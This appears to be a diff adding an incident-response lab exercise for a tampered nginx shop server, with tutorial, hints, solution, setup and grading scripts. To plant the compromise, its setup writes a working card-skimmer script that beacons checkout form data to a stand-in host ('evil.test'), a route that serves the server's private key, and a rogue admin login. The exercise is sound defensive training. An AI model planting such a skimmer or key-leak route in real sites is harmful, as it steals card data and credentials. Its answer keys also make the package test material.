+    CA="openssl ca -config /lab/pki/ca/openssl.cnf"
+    $CA -revoke /lab/pki/bob.crt -crl_reason keyCompromise 2>/dev/null
+    $CA -gencrl -out /lab/nginx/tls/clients.crl 2>/dev/null
+    openssl req -new -newkey rsa:2048 -nodes -keyout /lab/pki/bob-new.key -out /lab/pki/bob-new.csr -subj "/CN=bob" 2>/dev/null
+    $CA -batch -notext -in /lab/pki/bob-new.csr -out /lab/pki/bob-new.crt 2>/dev/null
+    grep -q ssl_crl /lab/nginx/default.conf || \
+      sed -i 's|^\( *\)ssl_verify_client on;|&\n\1ssl_crl /etc/nginx/conf.d/tls/clients.crl;|' /lab/nginx/default.conf
+    docker exec kl-web nginx -s reload
+
+- id: sec-089
+  title: "Incident: the web tier was tampered with"
+  difficulty: 5
+  kind: fix
+  tags: [incident-response, nginx, tls, integrity, web, containment]
+  tutorial: |
+    **Concept.** When a web server has been in an attacker's hands, the
+    response is more than deleting the obvious file. Find **everything** they
+    changed: configuration (a backdoor route, weakened TLS), credentials (an
+    extra login), content (a skimmer injected into the checkout page), and
+    what they **took**. Content is restored from the **release artifact**,
+    checked against its manifest. It is never "cleaned up" by hand. A private
+    key that was exposed is **compromised**. Hiding it again isn't enough:
+    issue a new key and certificate, because the old pair now works for the
+    attacker too.
+
+    **Read up on:**
+    - `sha256sum -c` against a release manifest; `comm` to find extra files
+    - `docker logs` for nginx's access log
+    - `htpasswd -D`, `openssl req` / `openssl x509 -req` for a re-key
+  scenario: |
+    **`kl-web`** runs the shop on **`https://web.lab.test:8443/`** (reach it
+    with `--resolve web.lab.test:8443:127.0.0.1`; HTTP on 8080 redirects
+    there). Configuration **`/lab/nginx/default.conf`** (mounted at
+    `/etc/nginx/conf.d`), content **`/lab/nginx/html`**, logins
+    **`/lab/nginx/htpasswd`** (`ops`, password in **`/lab/ops-password.txt`**,
+    is the only legitimate one). The last release is **`/lab/release/html.tar.gz`**
+    with its manifest **`/lab/release/SHA256SUMS`**. Your internal CA is
+    **`/lab/pki/ca.crt`** / **`ca.key`**. The server was compromised.
+    `docker logs kl-web` holds the access log.
+
+    Write **`/lab/incident.txt`** with three `key=value` lines:
+
+    - `key_leak_path` = the URL path the attacker added to download the
+      server's private key
+    - `rogue_user` = the login they added
+    - `exfil_host` = the host name the injected script sends card data to
+
+    Then recover:
+
+    - the backdoor URL answers **404** and no private key is served anywhere
+    - **re-key**: a new key and certificate at `/lab/nginx/tls/web.key` and
+      `web.crt` (signed by your CA, valid for `web.lab.test`), served by kl-web
+    - TLS back to policy: **TLS 1.0 and 1.1 refused**; TLS 1.2 only with
+      **ECDHE + AEAD** suites (`ECDHE-RSA-AES128-GCM-SHA256` works,
+      `AES256-SHA` and `ECDHE-RSA-AES128-SHA` are refused); TLS 1.3 works
+    - only `ops` in the htpasswd file, and `ops` can still open `/admin/`
+    - `/lab/nginx/html` matches the release manifest exactly, with no extra
+      files. Leave `/lab/release` as it is.
+
+    The check restarts `kl-web` with your configuration.
+  hints:
+    - "Start with what changed: `cd /lab/nginx/html && sha256sum -c /lab/release/SHA256SUMS`, and `comm -13 <(awk '{print $2}' /lab/release/SHA256SUMS | sort) <(find . -type f | sort)` for files the release never had. Read them before deleting anything."
+    - "`docker logs kl-web 2>&1 | grep -v ' 200 .*ops'` and the `location` blocks in default.conf: one of them serves a file nobody should get."
+    - "Restore content with `rm -rf /lab/nginx/html && mkdir /lab/nginx/html && tar -xzf /lab/release/html.tar.gz -C /lab/nginx/html`. `htpasswd -D /lab/nginx/htpasswd USER` drops a login."
+    - "Re-key exactly as in an issuance: new key + CSR for `CN=web.lab.test`, signed with `-extfile` holding `subjectAltName=DNS:web.lab.test`. Then fix `ssl_protocols`/`ssl_ciphers` and `docker restart kl-web`."
+  solution: |
+    ```bash
+    cd /lab
+    # what did they take, add and change?
+    docker logs kl-web 2>&1 | tail -20
+    leak=$(awk '/^[[:space:]]*location/{l=$(NF-1)} /alias[^;]*\.key/{print l}' nginx/default.conf | head -1)
+    rogue=$(cut -d: -f1 nginx/htpasswd | grep -vx ops)
+    extra=$(comm -13 <(awk '{print $2}' release/SHA256SUMS | sort) <(cd nginx/html && find . -type f | sort))
+    host=$(cd nginx/html && cat $extra | grep -oE 'https?://[^/"]+' | head -1 | sed 's#.*//##')
+    printf 'key_leak_path=%s\nrogue_user=%s\nexfil_host=%s\n' "$leak" "$rogue" "$host" > incident.txt
+
+    # content from the release
+    rm -rf nginx/html && mkdir nginx/html && tar -xzf release/html.tar.gz -C nginx/html
+    # logins
+    htpasswd -D nginx/htpasswd "$rogue"; chmod 644 nginx/htpasswd
+    # backdoor route out, TLS back to policy
+    awk -v l="location = $leak {" 'index($0, l) {skip=1} !skip {print} skip && /^[[:space:]]*}/ {skip=0}' \
+      nginx/default.conf > /tmp/conf && cat /tmp/conf > nginx/default.conf
+    sed -i -e 's/^\( *\)ssl_protocols .*/\1ssl_protocols TLSv1.2 TLSv1.3;/' \
+           -e "s/^\( *\)ssl_ciphers .*/\1ssl_ciphers 'ECDHE+AESGCM:ECDHE+CHACHA20';/" nginx/default.conf
+    # re-key
+    openssl req -new -newkey rsa:2048 -nodes -keyout nginx/tls/web.key -out /tmp/web.csr -subj "/CN=web.lab.test"
+    printf 'subjectAltName=DNS:web.lab.test\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n' > /tmp/web.ext
+    openssl x509 -req -in /tmp/web.csr -CA pki/ca.crt -CAkey pki/ca.key -CAcreateserial -days 90 \
+      -extfile /tmp/web.ext -out nginx/tls/web.crt
+    docker restart kl-web
+    ```
+  setup: |
+    rm -rf /lab/nginx /lab/pki /lab/release /lab/ops-password.txt /lab/incident.txt
+    mkdir -p /lab/nginx/html/shop/js /lab/nginx/html/admin /lab/nginx/tls /lab/pki /lab/release
+    t=$(mktemp -d)
+    rnd() { head -c "$1" /dev/urandom | od -An -tx1 | tr -d ' \n'; }
+    tok=$(rnd 8); pw=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 14); rpw=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 14)
+    rogue=$(printf '%s\n' support backup svc-web monitor | shuf -n1)
+    leak=/$(printf '%s\n' static-cache healthz-v2 cdn-sync assets-map | shuf -n1)-$(rnd 2)
+    host=$(printf '%s\n' cdn-jquery metrics-pixel fonts-cache | shuf -n1).$(printf '%s\n' evil.test bad.example | shuf -n1)
+    skim=jq-$(rnd 3).min.js
+    printf '%s\n' "$tok" "$pw" "$rpw" "$rogue" "$leak" "$host" > "$KL_STATE/answer"
+    echo "$pw" > /lab/ops-password.txt; chmod 600 /lab/ops-password.txt
+    # the internal CA and the server certificate the attacker stole
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout /lab/pki/ca.key -out /lab/pki/ca.crt \
+      -days 365 -subj "/CN=Acme Internal CA" 2>/dev/null
+    openssl req -new -newkey rsa:2048 -nodes -keyout /lab/nginx/tls/web.key -out "$t/web.csr" -subj "/CN=web.lab.test" 2>/dev/null
+    printf 'subjectAltName=DNS:web.lab.test\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n' > "$t/web.ext"
+    openssl x509 -req -in "$t/web.csr" -CA /lab/pki/ca.crt -CAkey /lab/pki/ca.key -CAserial "$t/srl" -CAcreateserial \
+      -days 90 -extfile "$t/web.ext" -out /lab/nginx/tls/web.crt 2>/dev/null
+    openssl pkey -in /lab/nginx/tls/web.key -pubout > "$KL_STATE/oldpub"
+    # the site as released
+    H=/lab/nginx/html
+    printf '<!doctype html><html><body><h1>Acme shop</h1><p>%s</p><a href="/shop/">Shop</a></body></html>\n' "$tok" > $H/index.html
+    printf '<!doctype html><html><body><h1>About Acme</h1></body></html>\n' > $H/about.html
+    printf '<!doctype html><html><body><h1>Products</h1><a href="/shop/checkout.html">Checkout</a></body></html>\n' > $H/shop/index.html
+    cat > $H/shop/checkout.html <<'EOF'
+    <!doctype html>
+    <html><head><title>Checkout</title></head>
+    <body>
+    <form id="pay" method="post" action="/shop/pay">
+      <input name="card" placeholder="Card number"><input name="cvv" placeholder="CVV">
+      <button>Pay</button>
+    </form>
+    <script src="/shop/js/cart.js"></script>
+    </body></html>
+    EOF
+    printf 'document.getElementById("pay").addEventListener("submit", function () { console.log("paying"); });\n' > $H/shop/js/cart.js
+    printf '<!doctype html><html><body><h1>Admin</h1></body></html>\n' > $H/admin/index.html
+    (cd $H && find . -type f | sort | xargs sha256sum) > /lab/release/SHA256SUMS
+    tar -czf /lab/release/html.tar.gz -C $H .
+    sha256sum /lab/release/SHA256SUMS /lab/release/html.tar.gz > "$KL_STATE/release"
+    # the attacker's changes
+    sed -i "s#</body></html>#<script src=\"/shop/js/$skim\"></script>\n</body></html>#" $H/shop/checkout.html
+    cat > "$H/shop/js/$skim" <<EOF
+    document.getElementById("pay").addEventListener("submit",function(e){navigator.sendBeacon("https://$host/c",new URLSearchParams(new FormData(e.target)));});
+    EOF
+    htpasswd -cb /lab/nginx/htpasswd ops "$pw" >/dev/null 2>&1
+    htpasswd -b /lab/nginx/htpasswd "$rogue" "$rpw" >/dev/null 2>&1
+    chmod 644 /lab/nginx/htpasswd
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        server_tokens off;
+        return 301 https://web.lab.test:8443$request_uri;
+    }
+
+    server {
+        listen 443 ssl;
+        server_name web.lab.test;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+        server_tokens off;
+
+        ssl_certificate     /etc/nginx/conf.d/tls/web.crt;
+        ssl_certificate_key /etc/nginx/conf.d/tls/web.key;
+        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
+        ssl_ciphers 'ALL:!aNULL:@SECLEVEL=0';
+
+        location / {
+            try_files $uri $uri/ =404;
+        }
+
+        location = LEAKPATH {
+            default_type text/plain;
+            alias /etc/nginx/conf.d/tls/web.key;
+        }
+
+        location /admin/ {
+            auth_basic "Admin";
+            auth_basic_user_file /etc/nginx/conf.d/htpasswd;
+            try_files $uri $uri/ =404;
+        }
+    }
+    EOF
+    sed -i "s#LEAKPATH#$leak#" /lab/nginx/default.conf
+    chmod 644 /lab/nginx/tls/web.key
+    rm -rf "$t"
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -p 127.0.0.1:8443:443 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+    # some traffic, the intruder's included
+    R="--resolve web.lab.test:8443:127.0.0.1"
+    for p in / /about.html /shop/ /shop/checkout.html; do curl -sk -m 3 $R -o /dev/null -A "Mozilla/5.0" "https://web.lab.test:8443$p"; done
+    curl -sk -m 3 $R -o /dev/null -A "python-requests/2.31.0" "https://web.lab.test:8443$leak"
+    curl -sk -m 3 $R -o /dev/null -u "$rogue:$rpw" -A "python-requests/2.31.0" https://web.lab.test:8443/admin/
+    curl -sk -m 3 $R -o /dev/null -u "ops:$pw" -A "Mozilla/5.0" https://web.lab.test:8443/admin/
+    true
+  check: |
+    { read -r tok; read -r pw; read -r rpw; read -r rogue; read -r leak; read -r host; } < "$KL_STATE/answer"
+    R="--resolve web.lab.test:8443:127.0.0.1"
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    k() { curl -sk -m 5 $R "$@"; }
+    tls() { timeout 5 openssl s_client -connect 127.0.0.1:8443 -servername web.lab.test "$@" </dev/null 2>&1 | grep -q 'Cipher is [A-Z]'; }
+    g() { grep -E "^$1=" /lab/incident.txt 2>/dev/null | head -1 | cut -d= -f2- | tr -d '[:space:]'; }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    check_eq "incident.txt key_leak_path" "$(g key_leak_path)" "$leak"
+    check_eq "incident.txt rogue_user" "$(g rogue_user)" "$rogue"
+    check_eq "incident.txt exfil_host" "$(g exfil_host)" "$host"
+    check_eq "the backdoor URL is gone" "$(k -o /dev/null -w '%{http_code}' "https://web.lab.test:8443$leak")" 404
+    check_not "no private key is served at it" 'k "https://web.lab.test:8443$leak" | grep -q "PRIVATE KEY"'
+    check_not "no private key is under the web root" 'grep -rlq "PRIVATE KEY" /lab/nginx/html'
+    served=$(timeout 5 openssl s_client -connect 127.0.0.1:8443 -servername web.lab.test </dev/null 2>/dev/null | openssl x509 -noout -pubkey 2>/dev/null)
+    check "kl-web serves a new key (the stolen one is retired)" '[ -n "$served" ] && [ "$served" != "$(cat "$KL_STATE/oldpub")" ]'
+    check "web.key on disk is the new key" 'k2=$(openssl pkey -in /lab/nginx/tls/web.key -pubout 2>/dev/null) && [ "$k2" = "$served" ]'
+    check "HTTPS for web.lab.test verifies against the CA" 'curl -fs -m 5 --cacert /lab/pki/ca.crt $R https://web.lab.test:8443/ | grep -qF "$tok"'
+    check_not "TLS 1.0 is refused" 'tls -tls1 -cipher "DEFAULT:@SECLEVEL=0"'
+    check_not "TLS 1.1 is refused" 'tls -tls1_1 -cipher "DEFAULT:@SECLEVEL=0"'
+    check_not "TLS 1.2 refuses AES256-SHA" 'tls -tls1_2 -cipher AES256-SHA'
+    check_not "TLS 1.2 refuses ECDHE-RSA-AES128-SHA" 'tls -tls1_2 -cipher ECDHE-RSA-AES128-SHA'
+    check "TLS 1.2 accepts ECDHE-RSA-AES128-GCM-SHA256" 'tls -tls1_2 -cipher ECDHE-RSA-AES128-GCM-SHA256'
+    check "TLS 1.3 works" 'tls -tls1_3'
+    check_eq "only ops is in htpasswd" "$(cut -d: -f1 /lab/nginx/htpasswd 2>/dev/null | grep -v '^$' | sort -u | tr '\n' ' ')" "ops "
+    check_eq "ops can open /admin/" "$(k -o /dev/null -w '%{http_code}' -u "ops:$pw" https://web.lab.test:8443/admin/)" 200
+    check_eq "the rogue login is refused" "$(k -o /dev/null -w '%{http_code}' -u "$rogue:$rpw" https://web.lab.test:8443/admin/)" 401
+    check "the release artifacts are untouched" 'sha256sum --quiet -c "$KL_STATE/release"'
+    check "html matches the release manifest" '(cd /lab/nginx/html && sha256sum --quiet -c /lab/release/SHA256SUMS)'
+    check_eq "no files beyond the release" "$(cd /lab/nginx/html 2>/dev/null && find . -type f | sort | tr '\n' ' ')" "$(awk '{print $2}' /lab/release/SHA256SUMS | sort | tr '\n' ' ')"
+    check_not "the checkout page no longer loads the skimmer" 'k https://web.lab.test:8443/shop/checkout.html | grep -q "jq-"'
+  solve: |
+    cd /lab
+    leak=$(awk '/^[[:space:]]*location/{l=$(NF-1)} /alias[^;]*\.key/{print l}' nginx/default.conf | head -1)
+    rogue=$(cut -d: -f1 nginx/htpasswd | grep -vx ops | head -1)
+    extra=$(comm -13 <(awk '{print $2}' release/SHA256SUMS | sort) <(cd nginx/html && find . -type f | sort))
+    host=; [ -n "$extra" ] && host=$(cd nginx/html && cat $extra | grep -oE 'https?://[^/"]+' | head -1 | sed 's#.*//##')
+    [ -n "$leak" ] && printf 'key_leak_path=%s\nrogue_user=%s\nexfil_host=%s\n' "$leak" "$rogue" "$host" > incident.txt
+    rm -rf nginx/html && mkdir nginx/html && tar -xzf release/html.tar.gz -C nginx/html
+    [ -n "$rogue" ] && htpasswd -D nginx/htpasswd "$rogue"
+    chmod 644 nginx/htpasswd
+    if [ -n "$leak" ]; then
+      awk -v l="location = $leak {" 'index($0, l) {skip=1} !skip {print} skip && /^[[:space:]]*}/ {skip=0}' \
+        nginx/default.conf > nginx/default.conf.new && cat nginx/default.conf.new > nginx/default.conf
+      rm -f nginx/default.conf.new
+    fi
+    sed -i -e 's/^\( *\)ssl_protocols .*/\1ssl_protocols TLSv1.2 TLSv1.3;/' \
+           -e "s/^\( *\)ssl_ciphers .*/\1ssl_ciphers 'ECDHE+AESGCM:ECDHE+CHACHA20';/" nginx/default.conf
+    t=$(mktemp -d)
+    openssl req -new -newkey rsa:2048 -nodes -keyout nginx/tls/web.key -out "$t/web.csr" -subj "/CN=web.lab.test" 2>/dev/null
+    printf 'subjectAltName=DNS:web.lab.test\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n' > "$t/web.ext"
+    openssl x509 -req -in "$t/web.csr" -CA pki/ca.crt -CAkey pki/ca.key -CAserial "$t/srl" -CAcreateserial -days 90 \
+      -extfile "$t/web.ext" -out nginx/tls/web.crt 2>/dev/null
+    rm -rf "$t"
+    docker restart kl-web >/dev/null
